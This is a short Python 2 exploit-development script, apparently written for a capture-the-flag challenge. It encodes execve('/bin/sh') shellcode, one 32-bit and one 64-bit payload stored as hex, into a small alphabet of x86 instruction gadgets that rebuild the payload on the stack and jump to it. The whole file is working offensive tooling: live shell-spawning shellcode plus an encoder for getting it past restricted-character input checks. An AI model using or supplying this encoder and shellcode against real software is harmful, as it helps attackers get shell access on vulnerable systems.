#!/usr/bin/env python2
zeropad = lambda x: x.rjust(8, '0')
wordsuffix = lambda x, s: x + '\x00'*(s - (len(x) % s))

gadgets32 = {
    'shlrax': '\xd1\xe0',
    'incrax': '\x40',
    'pushrax': '\x50',
    'jmprsp': '\xff\xe4',
}
gadgets64 = {
    'shlrax': '\x48\xd1\xe0',
    'incrax': '\x48\xff\xc0',
    'pushrax': '\x50',
    'jmprsp': '\xff\xe4',
    }

def encode(x, sixtyfour):
    gadgets = gadgets64 if sixtyfour else gadgets32
    wordsize = 8 if sixtyfour else 4

    output = []
    i = 0

    for byte in reversed(wordsuffix(x,8)):
        bits_bigendian = zeropad(bin(ord(byte))[2:])
        for bit in bits_bigendian:
            output.append(gadgets['shlrax'])
            if bit == '1':
                output.append(gadgets['incrax'])
        i = (i+1)%wordsize
        if i == 0:
            output.append(gadgets['pushrax'])
    output.append(gadgets['jmprsp'])
    #output.append('\xcc')
    return ''.join(output)

def histogram(sc):
    d = dict()
    for b in sc:
        d[b] = d.get(b, 0) + 1
    return d

sc32 = '31c050682f2f7368682f62696e89e3505389e1b00bcd80'.decode('hex') # http://shell-storm.org/shellcode/files/shellcode-827.php
sc64 = '31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05'.decode('hex') # ragg2 -i exec

esc32 = encode(sc32, False)
esc64 = encode(sc64, True)

assert([len(histogram(esc).keys()) for esc in [esc32, esc64]] == [6, 7])
assert([len(esc) for esc in [esc32, esc64]] == [473, 1104])

print(encode(sc64, True))
